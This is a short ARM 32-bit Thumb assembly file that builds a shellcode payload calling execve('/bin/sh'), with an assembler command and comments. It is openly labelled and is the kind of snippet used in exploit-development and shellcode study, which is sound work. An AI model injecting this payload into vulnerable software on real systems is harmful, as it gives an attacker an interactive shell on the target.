; Linux ARM (32-bit Thumb) execve /bin/sh
; arm-linux-gnueabi-as -o execve_sh.o execve_sh.asm

.thumb
.globl _start
_start:
    .code 16

    ; execve("/bin/sh", NULL, NULL)
    adr     r0, binsh
    eor     r1, r1, r1
    eor     r2, r2, r2
    mov     r7, #11             ; __NR_execve (ARM)
    svc     #0

binsh:
    .ascii "/bin/sh\0"
